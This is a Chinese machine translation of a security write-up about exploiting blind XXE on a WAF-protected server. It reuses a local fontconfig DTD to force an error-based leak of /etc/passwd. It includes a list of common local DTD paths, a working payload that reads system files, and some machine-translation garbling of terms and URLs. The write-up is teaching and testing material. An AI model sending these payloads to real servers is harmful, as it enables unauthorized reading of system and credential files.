<html>
<head>
<title>Data exfiltration using XXE on a hardened server</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">在强化服务器上使用XXE进行数据渗透</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/data-exfiltration-using-xxe-on-a-hardened-server-ef3a3e5893ac?source=collection_archive---------4-----------------------#2022-01-29">https://infosecwriteups.com/data-exfiltration-using-xxe-on-a-hardened-server-ef3a3e5893ac?source=collection_archive---------4-----------------------#2022-01-29</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><figure class="ip iq gp gr ir is gh gi paragraph-image"><div role="button" tabindex="0" class="it iu di iv bf iw"><div class="gh gi io"><img src="../Images/240b2ebca861a98f9012b15b4b921ba1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hU5YvL9DrQQPetN123t9Sw.png"/></div></div><figcaption class="iz ja gj gh gi jb jc bd b be z dk translated">图片来源:<a class="ae jd" href="https://www.netsparker.com/blog/web-security/xxe-xml-external-entity-attacks/" rel="noopener ugc nofollow" target="_blank">https://www . net sparker . com/blog/we b-security/xxe-XML-external-entity-attacks/</a></figcaption></figure><div class=""/><blockquote class="kd ke kf"><p id="aeb3" class="kg kh ki kj b kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le ij bi translated">这是XXE的一个特例，所以在阅读本文之前，最好先了解一下XXE的基本情况。</p></blockquote><p id="357b" class="pw-post-body-paragraph kg kh jg kj b kk kl km kn ko kp kq kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">XXE代表XML外部实体。这是OWASP十大安全错误配置的一部分。该漏洞使得攻击者能够将XML解析器转换为代理。成功利用该漏洞会导致本地文件泄漏到SSRF甚至RCE。</p><p id="b112" class="pw-post-body-paragraph kg kh jg kj b kk kl km kn ko kp kq kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">关于XXE已经说得够多了，到了剥削的部分。</p><h1 id="a627" class="li lj jg bd lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf bi translated"><strong class="ak">检测和不成功的攻击尝试</strong></h1><p id="27d6" class="pw-post-body-paragraph kg kh jg kj b kk mg km kn ko mh kq kr lf mi ku kv lg mj ky kz lh mk lc ld le ij bi translated">作为我自动化的一部分，常规的细胞核扫描导致了盲XXE的检测。目标服务器在被注入带有interact sh(burp collaborator的项目发现替代方案)URL的XXE有效负载时，正在对主机名进行DNS查找。注入点在网页正文中，只需将请求从GET改为POST，将内容类型改为text/xml。当提供有效负载时，服务器没有返回任何内容(完全没有响应)。</p><p id="60f2" class="pw-post-body-paragraph kg kh jg kj b kk kl km kn ko kp kq kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated"><em class="ki">那么怎么回事，失明的XXE不能被剥削吗？</em></p><p id="7384" class="pw-post-body-paragraph kg kh jg kj b kk kl km kn ko kp kq kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">是的，它可以被利用，但有一些WAF阻止了所有传出的http流量。对于盲XXE，我们可以托管任何外部DTD文件，并让XML解析器向该文件发送请求，因为出站<em class="ki"> http </em>流量被阻止，我们可以通过任何上传功能在目标web服务器内部托管它，但网站没有尝试文件上传的功能。</p><h1 id="ef20" class="li lj jg bd lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf bi translated">成功的尝试</h1><p id="8906" class="pw-post-body-paragraph kg kh jg kj b kk mg km kn ko mh kq kr lf mi ku kv lg mj ky kz lh mk lc ld le ij bi translated">由于上传被阻止，我们可以使用一些内部DTD文件进行基于错误的攻击。</p><blockquote class="kd ke kf"><p id="c90b" class="kg kh ki kj b kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le ij bi translated">来源如下(1)</p></blockquote><p id="46d3" class="pw-post-body-paragraph kg kh jg kj b kk kl km kn ko kp kq kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">DTD是一种文档类型定义。它规定了XML文档的结构、元素和属性。</p><p id="7f3d" class="pw-post-body-paragraph kg kh jg kj b kk kl km kn ko kp kq kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">服务器上只有http、ftp和文件协议。希望在列举其他协议时，服务器响应一些错误。我们可以检查文件是否存在，我们可以使用<em class="ki">文件</em>协议。为了列举其他协议，我只是将“<em class="ki">文件”</em>替换为其他协议(gopher、smtp、ftp等)并查看错误消息。如果文件不存在，服务器会响应(没有这样的文件)以及其他错误。</p><figure class="mm mn mo mp gt is gh gi paragraph-image"><div role="button" tabindex="0" class="it iu di iv bf iw"><div class="gh gi ml"><img src="../Images/2d0a35f01a9471801ad388966ecc15c3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lTW1UAaEUq-KkvsGqwbnFQ.png"/></div></div></figure><pre class="mm mn mo mp gt mq mr ms mt aw mu bi"><span id="e3a6" class="mv lj jg mr b gy mw mx l my mz">&lt;?xml version=”1.0"?&gt;<br/>&lt;!DOCTYPE foo SYSTEM “file:///etc/passwd”&gt;<br/>&lt;foo&gt;&amp;e1;&lt;/foo&gt;</span></pre><figure class="mm mn mo mp gt is gh gi paragraph-image"><div role="button" tabindex="0" class="it iu di iv bf iw"><div class="gh gi na"><img src="../Images/4fe10b49e14b19ae5375674b959e5fc8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Yc6yMdIf_eQxat3TYeKWMA.png"/></div></div></figure><p id="0d84" class="pw-post-body-paragraph kg kh jg kj b kk kl km kn ko kp kq kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">这也证实了XXE注射液的存在，现在我们有“东西”可以玩了。</p><p id="5aad" class="pw-post-body-paragraph kg kh jg kj b kk kl km kn ko kp kq kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">这里常规的实体被阻塞了，所以我们必须使用一个包含预定义实体的DTD文件。WAF阻止了所有传出的http流量，没有办法上传文件，所以唯一的办法是使用服务器上已经存在的文件。默认情况下，操作系统包含一些DTD文件。在Linux系统中，其中一些是:</p><pre class="mm mn mo mp gt mq mr ms mt aw mu bi"><span id="bbcc" class="mv lj jg mr b gy mw mx l my mz">./properties/schemas/j2ee/XMLSchema.dtd<br/>./../properties/schemas/j2ee/XMLSchema.dtd<br/>./../../properties/schemas/j2ee/XMLSchema.dtd<br/>/usr/share/java/jsp-api-2.2.jar!/javax/servlet/jsp/resources/jspxml.dtd<br/>/usr/share/java/jsp-api-2.3.jar!/javax/servlet/jsp/resources/jspxml.dtd<br/>/root/usr/share/doc/rh-python34-python-docutils-0.12/docs/ref/docutils.dtd<br/>/root/usr/share/doc/rh-python35-python-docutils-0.12/docs/ref/docutils.dtd<br/>/usr/share/doc/python2-docutils/docs/ref/docutils.dtd<br/>/usr/share/yelp/dtd/docbookx.dtd<br/>/usr/share/xml/fontconfig/fonts.dtd<br/>/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd<br/>/usr/lib64/erlang/lib/docbuilder-0.9.8.11/dtd/application.dtd<br/>/usr/share/boostbook/dtd/1.1/boostbook.dtd<br/>/usr/share/boostbook/dtd/boostbook.dtd<br/>/usr/share/dblatex/schema/dblatex-config.dtd<br/>/usr/share/struts/struts-config_1_0.dtd<br/>/opt/sas/sw/tomcat/shared/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd</span></pre><blockquote class="kd ke kf"><p id="7678" class="kg kh ki kj b kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le ij bi translated">来源如下(2)</p></blockquote><p id="dbf7" class="pw-post-body-paragraph kg kh jg kj b kk kl km kn ko kp kq kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">现在，对于基于错误的攻击，有必要了解DTD文件中存在的实体。同样，我们可以使用如上所示的<em class="ki">文件</em>协议，通过提供各种文件路径并查看错误消息来检查DTD文件的存在。在我的测试中，我发现“/usr/share/XML/font config/fonts . dtd”文件存在于系统中。fonts.dtd文件有一个可注入的实体“%constant”。现在我只需要知道我要导出的文件的位置。对于PoC来说，“/etc/passwd”的内容就足够了。最终的有效载荷看起来像:</p><pre class="mm mn mo mp gt mq mr ms mt aw mu bi"><span id="5b52" class="mv lj jg mr b gy mw mx l my mz">&lt;!DOCTYPE message [<br/>    &lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd"&gt;</span><span id="ab67" class="mv lj jg mr b gy nb mx l my mz">&lt;!ENTITY % constant 'aaa)&gt;<br/>        &lt;!ENTITY &amp;#x25; file SYSTEM "file:///etc/passwd"&gt;<br/>        &lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///ritik/&amp;#x25;file;&amp;#x27;&gt;"&gt;<br/>        &amp;#x25;eval;<br/>        &amp;#x25;error;<br/>        &lt;!ELEMENT aa (bb'&gt;</span><span id="9966" class="mv lj jg mr b gy nb mx l my mz">%local_dtd;<br/>]&gt;<br/>&lt;message&gt;Text&lt;/message&gt;</span></pre><p id="2321" class="pw-post-body-paragraph kg kh jg kj b kk kl km kn ko kp kq kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">这个有效负载的工作方式类似于基于错误的XXE，唯一的不同是我们使用一个已经存在的dtd文件来触发错误。</p><p id="15fc" class="pw-post-body-paragraph kg kh jg kj b kk kl km kn ko kp kq kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">发送此有效负载时，解析错误包含指定文件的敏感数据。</p><figure class="mm mn mo mp gt is gh gi paragraph-image"><div role="button" tabindex="0" class="it iu di iv bf iw"><div class="gh gi nc"><img src="../Images/394674f68bd104a1b47f00d45bf5259b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ktBbJB984jgZXi-F9E3myg.png"/></div></div></figure><h1 id="44f2" class="li lj jg bd lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf bi translated"><strong class="ak">资源</strong></h1><p id="018f" class="pw-post-body-paragraph kg kh jg kj b kk mg km kn ko mh kq kr lf mi ku kv lg mj ky kz lh mk lc ld le ij bi translated">这些是我成功利用的资源。</p><ol class=""><li id="97c4" class="nd ne jg kj b kk kl ko kp lf nf lg ng lh nh le ni nj nk nl bi translated">发现这项技术的<a class="ae jd" href="https://mohemiv.com/" rel="noopener ugc nofollow" target="_blank"> Arseniy Sharoglazov </a>的博客:<a class="ae jd" href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/" rel="noopener ugc nofollow" target="_blank">https://mohemiv . com/all/exploining-xxe-with-local-dtd-files/</a></li><li id="92f3" class="nd ne jg kj b kk nm ko nn lf no lg np lh nq le ni nj nk nl bi translated">发现本地dtd文件:<a class="ae jd" href="https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/" rel="noopener ugc nofollow" target="_blank">https://www . go secure . net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/</a></li><li id="d142" class="nd ne jg kj b kk nm ko nn lf no lg np lh nq le ni nj nk nl bi translated">各种默认dtd文件中存在的实体列表:<a class="ae jd" href="https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md" rel="noopener ugc nofollow" target="_blank">https://github . com/go secure/dtd-finder/blob/master/list/xxe _ payloads . MD</a></li><li id="6151" class="nd ne jg kj b kk nm ko nn lf no lg np lh nq le ni nj nk nl bi translated">基于错误的XXE如何工作:<a class="ae jd" href="https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages" rel="noopener ugc nofollow" target="_blank">https://ports wigger . net/we b-security/xxe/blind # exploining-blind-xxe-to-retrieve-data-via-error-messages</a></li><li id="4464" class="nd ne jg kj b kk nm ko nn lf no lg np lh nq le ni nj nk nl bi translated">Portswigger实验室练习:<a class="ae jd" href="https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd" rel="noopener ugc nofollow" target="_blank">https://portswigger . net/we b-security/xxe/blind/la b-xxe-trigger-error-message-by-re purposing-local-dtd</a></li></ol></div><div class="ab cl nr ns hu nt" role="separator"><span class="nu bw bk nv nw nx"/><span class="nu bw bk nv nw nx"/><span class="nu bw bk nv nw"/></div><div class="ij ik il im in"><h1 id="39ec" class="li lj jg bd lk ll ny ln lo lp nz lr ls lt oa lv lw lx ob lz ma mb oc md me mf bi translated">🔈 🔈Infosec Writeups正在组织其首次虚拟会议和网络活动。如果你对信息安全感兴趣，这是最酷的地方，有16个令人难以置信的演讲者和10多个小时充满力量的讨论会议。<a class="ae jd" href="https://iwcon.live/" rel="noopener ugc nofollow" target="_blank">查看更多详情并在此注册。</a></h1><div class="ip iq gp gr ir od"><a href="https://iwcon.live/" rel="noopener  ugc nofollow" target="_blank"><div class="oe ab fo"><div class="of ab og cl cj oh"><h2 class="bd jh gy z fp oi fr fs oj fu fw jf bi translated">IWCon2022 - Infosec书面报告虚拟会议</h2><div class="ok l"><h3 class="bd b gy z fp oi fr fs oj fu fw dk translated">与世界上最优秀的信息安全专家建立联系。了解网络安全专家如何取得成功。将新技能添加到您的…</h3></div><div class="ol l"><p class="bd b dl z fp oi fr fs oj fu fw dk translated">iwcon.live</p></div></div><div class="om l"><div class="on l oo op oq om or ix od"/></div></div></a></div></div></div>    
</body>
</html>